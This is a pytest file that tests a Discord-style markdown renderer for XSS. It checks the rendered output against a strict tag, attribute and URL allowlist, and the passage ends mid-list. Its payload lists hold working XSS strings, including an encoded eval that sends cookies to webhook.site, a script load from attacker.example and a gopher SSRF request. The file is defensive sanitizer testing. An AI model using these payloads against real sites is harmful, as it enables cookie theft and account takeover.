# ruff: noqa: E501, PT018, ARG002, TRY003, EM101
"""XSS checks for web.discord_markdown.

Payloads from https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/xss-in-markdown.html
plus extra injection points. Rendered output is parsed and every tag,
attribute and URL is checked against an allowlist, instead of grepping
for "onerror" and friends.
"""

import re
import time
from collections.abc import Callable
from html.parser import HTMLParser
from urllib.parse import urlsplit

import pytest

from web.discord_markdown import render

HACKTRICKS_PAYLOADS = [
    '<script>\n  alert(1)\n</script>\n<img src="x" onerror="alert(1)" />',
    "[a](javascript:prompt(document.cookie))",
    "[Basic](javascript:alert('Basic')) [Local",
    "Storage](javascript:alert(JSON.stringify(localStorage)))",
    "[CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))",
    "[URL](javascript://www.google.com%0Aalert('URL')) [In",
    "Quotes]('javascript:alert(\"InQuotes\")') [a](j a v a s c r i p",
    "t:prompt(document.cookie))",
    "[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)",
    "[a](javascript:window.onerror=alert;throw%201)",
    "[Basic](javascript:alert('Basic')) [Local\nStorage](javascript:alert(JSON.stringify(localStorage)))\n[CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))\n[URL](javascript://www.google.com%0Aalert('URL')) [In\nQuotes]('javascript:alert(\"InQuotes\")') [a](j a v a s c r i p\nt:prompt(document.cookie))\n[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\n[a](javascript:window.onerror=alert;throw%201)",
    "![Uh oh...](<\"onerror=\"alert('XSS')>)",
    "![Uh oh...](<https://www.example.com/image.png\"onload=\"alert('XSS')>)",
    "![Escape SRC - onload](<https://www.example.com/image.png\"onload=\"alert('ImageOnLoad')>)",
    "![Escape SRC - onerror](<\"onerror=\"alert('ImageOnError')>)",
    '<div\n  id="1\n\n![](contenteditable/autofocus/onfocus=confirm(\'qwq\')//index.html)">\n  -----------------------------------------------\n  <a\n    title="a\n\n<img src=x onerror=alert(1)>"\n    >yep</a\n  >\n  ------------------------------------------------ [x](y \'<style>\n    \')<!--\n  </style>\n  <div id="x--><img src=1 onerror=alert(1)>"></div>\n  ---------------------------------------------- [\n  <p\n    x="<style onload=eval(atob(/bG9jYXRpb249YGh0dHBzOi8vd2ViaG9vay5zaXRlL2FiM2IyYjg5LTg1YTktNGU0YS1hNjg0LTUxN2M1ZjQwNmZmMj9mPWArZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmNvb2tpZSk/.source))>](#"></p>\n  ) ---------------------------------------------- `\n  <p x="`<img src=x onerror=alert(1)>"></p>\n</div>',
    '<svg></p><style><a id="</style><img src=x onerror=alert(1)>"></svg>',
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    '<base href="https://attacker.example/">\n<script src="/xss.js"></script>',
    "![pwn](gopher://127.0.0.1:1337/_GET%20/api/dev%20HTTP/1.1%0D%0AHost:%20127.0.0.1:1337%0D%0Ax-api-key:%20934caf984a4ca94817ead87d37af4b3%0D%0AConnection:%20close%0D%0A%0D%0A)",
    "[a](javascript:prompt(document.cookie))",
    "[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))",
    "![a](javascript:prompt(document.cookie))\\",
    "<javascript:prompt(document.cookie)>",
    "<javascript:alert('XSS')>",
    "  ![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\\",
    "[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)",
    "[a](javascript:alert('XSS'))",
    "![a'\"`onerror=prompt(document.cookie)](x)\\",
    "[citelol]: (javascript:prompt(document.cookie))",
    "[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)",
    "[test](javascript://%0d%0aprompt(1))",
    "[test](javascript://%0d%0aprompt(1);com)",
    "[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)",
    "[notmalicious](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)",
    "[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)",
    "[clickme](vbscript:alert(document.domain))",
    "_http://danlec_@.1 style=background-image:url(data:image/png;base64,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);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//",
    '<http://\\<meta\\ http-equiv=\\"refresh\\"\\ content=\\"0;\\ url=http://danlec.com/\\"\\>>',
    '[text](http://danlec.com " [@danlec](/danlec) ")',
    "[a](javascript:this;alert(1))",
    "[a](javascript:this;alert(1&#41;)",
    "[a](javascript&#58this;alert(1&#41;)",
    "[a](Javas&#99;ript:alert(1&#41;)",
    "[a](Javas%26%2399;ript:alert(1&#41;)",
    "[a](javascript:alert&#65534;(1&#41;)",
    "[a](javascript:confirm(1)",
    "[a](javascript://www.google.com%0Aprompt(1))",
    "[a](javascript://%0d%0aconfirm(1);com)",
    "[a](javascript:window.onerror=confirm;throw%201)",
    "[a](\x01javascript:alert(document.domain&#41;)",
    "[a](javascript://www.google.com%0Aalert(1))",
    "[a]('javascript:alert(\"1\")')",
    "[a](JaVaScRiPt:alert(1))",
    '![a](https://www.google.com/image.png"onload="alert(1))',
    '![a]("onerror="alert(1))',
    "</http://<?php\\><\\h1\\><script:script>confirm(2)",
    "[XSS](.alert(1);)",
    "[ ](https://a.de?p=[[/data-x=. style=background-color:#000000;z-index:999;width:100%;position:fixed;top:0;left:0;right:0;bottom:0; data-y=.]])",
    "[ ](http://a?p=[[/onclick=alert(0) .]])",
    "[a](javascript:new%20Function`al\\ert\\`1\\``;)",
    "[XSS](javascript:prompt(document.cookie))",
    "[XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))",
    "[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)",
    "[XSS](javascript:alert('XSS'))",
    "[XSS]: (javascript:prompt(document.cookie))",
    "[XSS](javascript:window.onerror=alert;throw%20document.cookie)",
    "[XSS](javascript://%0d%0aprompt(1))",
    "[XSS](javascript://%0d%0aprompt(1);com)",
    "[XSS](javascript:window.onerror=alert;throw%20document.cookie)",
    "[XSS](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)",
    "[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)",
    "[XSS](vbscript:alert(document.domain))",
    "[XSS](javascript:this;alert(1))",
    "[XSS](javascript:this;alert(1&#41;)",
    "[XSS](javascript&#58this;alert(1&#41;)",
    "[XSS](Javas&#99;ript:alert(1&#41;)",
    "[XSS](Javas%26%2399;ript:alert(1&#41;)",
    "[XSS](javascript:alert&#65534;(1&#41;)",
    "[XSS](javascript:confirm(1)",
    "[XSS](javascript://www.google.com%0Aprompt(1))",
    "[XSS](javascript://%0d%0aconfirm(1);com)",
    "[XSS](javascript:window.onerror=confirm;throw%201)",
    "[XSS](�javascript:alert(document.domain&#41;)",
    "![XSS](javascript:prompt(document.cookie))\\",
    "![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\\",
    "![XSS'\"`onerror=prompt(document.cookie)](x)\\",
    '[a](javascript:prompt(document.cookie))\n[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))\n![a](javascript:prompt(document.cookie))\\\n<javascript:prompt(document.cookie)>\n<javascript:alert(\'XSS\')>\n  ![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\\\n[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\n[a](javascript:alert(\'XSS\'))\n![a\'"`onerror=prompt(document.cookie)](x)\\\n[citelol]: (javascript:prompt(document.cookie))\n[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)\n[test](javascript://%0d%0aprompt(1))\n[test](javascript://%0d%0aprompt(1);com)\n[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)\n[notmalicious](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)\n[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\n[clickme](vbscript:alert(document.domain))\n_http://danlec_@.1 style=background-image:url(data:image/png;base64,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);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//\n<http://\\<meta\\ http-equiv=\\"refresh\\"\\ content=\\"0;\\ url=http://danlec.com/\\"\\>>\n[text](http://danlec.com " [@danlec](/danlec) ")\n[a](javascript:this;alert(1))\n[a](javascript:this;alert(1&#41;)\n[a](javascript&#58this;alert(1&#41;)\n[a](Javas&#99;ript:alert(1&#41;)\n[a](Javas%26%2399;ript:alert(1&#41;)\n[a](javascript:alert&#65534;(1&#41;)\n[a](javascript:confirm(1)\n[a](javascript://www.google.com%0Aprompt(1))\n[a](javascript://%0d%0aconfirm(1);com)\n[a](javascript:window.onerror=confirm;throw%201)\n[a](\x01javascript:alert(document.domain&#41;)\n[a](javascript://www.google.com%0Aalert(1))\n[a](\'javascript:alert("1")\')\n[a](JaVaScRiPt:alert(1))\n![a](https://www.google.com/image.png"onload="alert(1))\n![a]("onerror="alert(1))\n</http://<?php\\><\\h1\\><script:script>confirm(2)\n[XSS](.alert(1);)\n[ ](https://a.de?p=[[/data-x=. style=background-color:#000000;z-index:999;width:100%;position:fixed;top:0;left:0;right:0;bottom:0; data-y=.]])\n[ ](http://a?p=[[/onclick=alert(0) .]])\n[a](javascript:new%20Function`al\\ert\\`1\\``;)\n[XSS](javascript:prompt(document.cookie))\n[XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))\n[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\n[XSS](javascript:alert(\'XSS\'))\n[XSS]: (javascript:prompt(document.cookie))\n[XSS](javascript:window.onerror=alert;throw%20document.cookie)\n[XSS](javascript://%0d%0aprompt(1))\n[XSS](javascript://%0d%0aprompt(1);com)\n[XSS](javascript:window.onerror=alert;throw%20document.cookie)\n[XSS](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)\n[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\n[XSS](vbscript:alert(document.domain))\n[XSS](javascript:this;alert(1))\n[XSS](javascript:this;alert(1&#41;)\n[XSS](javascript&#58this;alert(1&#41;)\n[XSS](Javas&#99;ript:alert(1&#41;)\n[XSS](Javas%26%2399;ript:alert(1&#41;)\n[XSS](javascript:alert&#65534;(1&#41;)\n[XSS](javascript:confirm(1)\n[XSS](javascript://www.google.com%0Aprompt(1))\n[XSS](javascript://%0d%0aconfirm(1);com)\n[XSS](javascript:window.onerror=confirm;throw%201)\n[XSS](�javascript:alert(document.domain&#41;)\n![XSS](javascript:prompt(document.cookie))\\\n![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\\\n![XSS\'"`onerror=prompt(document.cookie)](x)\\',
]

EXTRA_PAYLOADS = [
    # Breaking out of the href attribute
    '[a](https://x.com"onmouseover="alert(1))',
    "[a](https://x.com&quot;onclick=alert(1))",
    '[a](<https://x.com" onclick="alert(1)>)',
    '<https://x.com/"onclick=alert(1)>',
    'https://x.com/"onclick=alert(1)',
    "https://x.com/'onclick=alert(1)",
    # Scheme obfuscation
    "[a](java\x00script:alert(1))",
    "[a](\tjavascript:alert(1))",
    "[a](\x01javascript:alert(1))",
    "[a](%6Aavascript:alert(1))",
    "[a](&#106;avascript:alert(1))",
    "[a](&#x6A;avascript:alert(1))",
    "[a](javascript&colon;alert(1))",
    "[a](%256Aavascript:alert(1))",
    "[a](https:alert(1))",
    "<javascript:alert(1)>",
    "<data:text/html,<script>alert(1)</script>>",
    # Relative URLs: not XSS, but Discord wouldn't link them
    "[a](//evil.com)",
    "[a](/guilds/1/delete)",
    "[a](evil.com)",
    "[a](\\\\evil.com)",
    # Titles and code block info strings are dropped, not rendered
    "[a](https://x.com 'title\"><img src=x onerror=alert(1)>')",
    '[a](https://x.com "x" onclick="alert(1)")',
    '```js" onload="alert(1)\ncode\n```',
    "```<img src=x onerror=alert(1)>\ncode\n```",
    # Raw HTML inside Discord-only syntax
    "||<img src=x onerror=alert(1)>||",
    "__<script>alert(1)</script>__",
    "-# <svg onload=alert(1)>",
    "# <iframe src=javascript:alert(1)>",
    "> <style>*{display:none}</style>",
    "- <a href=javascript:alert(1)>x</a>",
    "`<script>alert(1)</script>`",
    "[<img src=x onerror=alert(1)>](https://x.com)",
    "[a](https://x.com)<img src=x onerror=alert(1)>",
    # Entities and comments
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "<!-- --><script>alert(1)</script>",
    "<![CDATA[<script>alert(1)</script>]]>",
    # HTML inside fenced code bodies
    "```\n<img src=x onerror=alert(1)>\n```",
    "```js\n</code></pre><script>alert(1)</script>\n```",
    "~~~\n<svg onload=alert(1)>\n~~~",
    "```\nunclosed <script>alert(1)</script>",
    # Schemes with a host, so only the scheme allowlist stops them
    "[a](javascript://x.com/%0Aalert(1))",
    "[a](javascript://x.com/%0D%0Aalert(1))",
    "[a](data://x.com/text/html,<script>alert(1)</script>)",
    "[a](ftp://x.com)",
    "[a](mailto://x.com)",
    "[a](tel://x.com)",
    "<javascript://x.com/%0Aalert(1)>",
    # Discord tokens: mentions, timestamps and emoji render as HTML
    "<@123> <#456> <@&789> <t:1700000000:R> <:pog:1> <a:dance:2> @everyone",
    # Names are 2+ word characters, so these reach the id part of the pattern
    '<:xx:1" onerror="alert(1)>',
    '<a:xx:1"><img src=x onerror=alert(1)>>',
    '<:xx" onerror="alert(1):1>',
    '<t:1:R" onclick="alert(1)>',
    '<t:1" onclick="alert(1)>',
    "<t:1:<script>>",
    "<@1 onmouseover=alert(1)>",
    '<#1"><script>alert(1)</script>>',
    "<@&1><img src=x onerror=alert(1)>",
    "[<:xx:1>](javascript:alert(1))",
    "<:xx:" + "9" * 50 + ">",
]

# Every payload is also tried inside each Discord construct, so escaping
# can't be missing from just one handler.
CONTEXTS = [
    "{}",
    "> {}",
    ">>> {}",
    "- {}",
    "1. {}",
    "||{}||",
    "# {}",
    "-# {}",
    "[{}](https://x.com)",
    "__{}__",
    "***{}***",
    "~~{}~~",
]
CONTEXTUAL_PAYLOADS = [
    pytest.param(context.replace("{}", payload), id=f"c{c}-p{p}")
    for c, context in enumerate(CONTEXTS)
    for p, payload in enumerate(HACKTRICKS_PAYLOADS + EXTRA_PAYLOADS)
]

ALLOWED_TAGS = {
    "a": {"class", "href", "target", "rel"},
    "span": {"class", "tabindex"},
    "ol": {"class", "start"},
    "time": {"class", "data-dc-ts", "datetime", "data-dc-style"},
    "img": {"class", "src", "alt", "draggable", "loading", "referrerpolicy"},
    "blockquote": {"class"},
    "code": {"class"},
    "pre": {"class"},
    "p": {"class"},
    "ul": {"class"},
    "bdi": set(),
    "li": set(),
    "strong": set(),
    "em": set(),
    "u": set(),
    "del": set(),
}
# Attributes some tags must always have, with these exact values.
REQUIRED_ATTRS = {
    "a": {
        "class": "dc-link",
        "target": "_blank",
        "rel": "noopener noreferrer nofollow",
    },
    "img": {
        "class": "dc-emoji",
        "draggable": "false",
        "loading": "lazy",
        "referrerpolicy": "no-referrer",
    },
}
ALLOWED_CLASSES = {
    "dc-link",
    "dc-link-host",
    "dc-spoiler",
    "dc-code",
    "dc-codeblock",
    "dc-quote",
    "dc-list",
    "dc-subtext",
    "dc-h1",
    "dc-h2",
    "dc-h3",
    "dc-gap",
    "dc-mention",
    "dc-timestamp",
    "dc-emoji",
}
VOID_TAGS = {"img"}
# Block tags can't sit inside these: browsers would close the parent early
# and build a different tree from the one checked here.
BLOCK_TAGS = {"p", "ul", "ol", "li", "blockquote", "pre"}
PHRASING_TAGS = {"p", "span", "a", "strong", "em", "u", "del", "code", "bdi", "time"}
EMOJI_SRC = re.compile(r"https://cdn\.discordapp\.com/emojis/\d+\.(?:webp|gif)\?size=48")


def is_http_url(value: str) -> bool:
    # html.parser has already decoded entities, like a browser would.
    parts = urlsplit(value)
    return parts.scheme in {"http", "https"} and bool(parts.netloc)


ATTR_VALUE_CHECKS: dict[str, Callable[[str], bool]] = {
    "class": lambda value: value in ALLOWED_CLASSES,
    "href": is_http_url,
    "start": str.isdigit,
    "src": lambda value: EMOJI_SRC.fullmatch(value) is not None,
    "data-dc-ts": lambda value: value.lstrip("-").isdigit(),
    "tabindex": lambda value: value.lstrip("-").isdigit(),
    "data-dc-style": lambda value: value in set("tTdDfFRS"),
}


class AllowlistChecker(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.stack: list[str] = []
        self.tags: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        assert tag in ALLOWED_TAGS, f"tag <{tag}>"
        seen: dict[str, str] = {}
        for name, raw_value in attrs:
            value = raw_value or ""
            assert name in ALLOWED_TAGS[tag], f"attribute {name} on <{tag}>"
            assert name not in seen, f"duplicate {name} on <{tag}>"
            seen[name] = value
            check = ATTR_VALUE_CHECKS.get(name)
            assert check is None or check(value), f"{name} {value!r}"
        for name, value in REQUIRED_ATTRS.get(tag, {}).items():
            assert seen.get(name) == value, f"{name} on <{tag}> is {seen.get(name)!r}"
        if tag == "a":
            assert "href" in seen, "<a> without href"
        self.check_nesting(tag)
        self.tags.append(tag)
        if tag not in VOID_TAGS:
            self.stack.append(tag)

    def check_nesting(self, tag: str) -> None:
        parent = self.stack[-1] if self.stack else None
        # Browsers close the outer link when a nested one opens: the trees differ.
        assert not (tag == "a" and "a" in self.stack), "<a> inside <a>"
        if tag in BLOCK_TAGS:
            assert parent not in PHRASING_TAGS, f"<{tag}> inside <{parent}>"
        if tag == "li":
            assert parent in {"ul", "ol"}, "<li> outside a list"

    def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        assert tag in VOID_TAGS, f"self-closing <{tag}/>"
        self.handle_starttag(tag, attrs)

    def handle_endtag(self, tag: str) -> None:
        if tag in VOID_TAGS:
            return
        # Balanced tags: nothing the browser could re-parse into another tree.
        assert self.stack and self.stack.pop() == tag, f"unbalanced </{tag}>"

    def handle_comment(self, data: str) -> None:
        raise AssertionError("comment in output")

    def handle_decl(self, decl: str) -> None:
        raise AssertionError("declaration in output")

    def handle_pi(self, data: str) -> None:
        raise AssertionError("processing instruction in output")

    def unknown_decl(self, data: str) -> None:
        raise AssertionError("CDATA/unknown declaration in output")


def assert_safe(html: str) -> AllowlistChecker:
    # html.parser hands an unfinished trailing tag back as text, so check for one:
    # escaped output never has a raw "<" after the last ">".
    assert html.rfind("<") <= html.rfind(">"), "unfinished tag at the end"
    checker = AllowlistChecker()
    checker.feed(html)
    checker.close()
    assert not checker.stack, f"unclosed {checker.stack}"
    return checker


@pytest.mark.parametrize(
    ("html", "reason"),
    [
        ('<img src="x">', "src 'x'"),
        ('<p onclick="x">a</p>', "attribute onclick on <p>"),
        ('<a href="javascript:alert(1)">a</a>', "href 'javascript:alert"),
        ('<a href="&#106;avascript:alert(1)">a</a>', "href 'javascript:alert"),
        ('<a href="//evil.com">a</a>', "href '//evil.com'"),
        ('<p class="evil">a</p>', "class 'evil'"),
        ("<p><!-- x --></p>", "comment in output"),
        ("<p><em>a</p></em>", "unbalanced </p>"),
        ("<p>a", "unclosed"),
        (
            (
                '<a class="dc-link" href="https://a.com" target="_blank" rel="noopener noreferrer nofollow">'
                '<a class="dc-link" href="https://b.com" target="_blank" rel="noopener noreferrer nofollow">'
                "b</a></a>"
            ),
            "<a> inside <a>",
        ),
        (
            '<img class="dc-emoji" src="https://evil.com/x.png">',
            "src 'https://evil.com/x.png'",
        ),
        ('<a class="dc-link" href="https://x.com">x</a>', "target on <a> is None"),
        (
            '<a class="dc-link" href="https://x.com" target="_blank" rel="nofollow">x</a>',
            "rel on <a> is 'nofollow'",
        ),
        ('<p class="dc-h1" class="dc-h2">x</p>', "duplicate class on <p>"),
        ('<p><ul class="dc-list"><li>x</li></ul></p>', "<ul> inside <p>"),
        ("<p><li>x</li></p>", "<li> inside <p>"),
        ("<blockquote><li>x</li></blockquote>", "<li> outside a list"),
        ('<p>x</p><a href="https://x.com"', "unfinished tag at the end"),
    ],
)
def test_checker_rejects_unsafe_html(html: str, reason: str) -> None:
    with pytest.raises(AssertionError, match=re.escape(reason)):
        assert_safe(html)


@pytest.mark.parametrize("payload", CONTEXTUAL_PAYLOADS)
def test_payload_renders_safely(payload: str) -> None:
    assert_safe(str(render(payload)))


@pytest.mark.parametrize(
    "payload",
    [
        "[a](//evil.com)",
        "[a](/guilds/1/delete)",
        "[a](evil.com)",
        "[a](https:alert(1))",
        "[a](javascript:alert(1))",
        "https://google.com@evil.com",
        "[a](https://user:pass@x.com)",
        "www.x.com",
        "a@b.com",
        # Hosts a browser would reject, so the shown host would be wrong
        "[a](https://evil.com%2F.google.com)",
        "[a](<https://evil.com\t.google.com>)",
        "https://evil.com\\.google.com",
        "[a](https://a..b.com)",
        "[a](mailto://x.com)",
        "[a](ftp://x.com)",
        "[a](javascript://x.com/%0Aalert(1))",
    ],
)
def test_no_link_rendered(payload: str) -> None:
    assert "a" not in assert_safe(str(render(payload))).tags


@pytest.mark.parametrize(
    "payload",
    [
        ">" * 10_000 + " x",
        "- " * 5_000 + "x",
        "*" * 10_000,
        "_" * 10_000,
        "|" * 10_000,
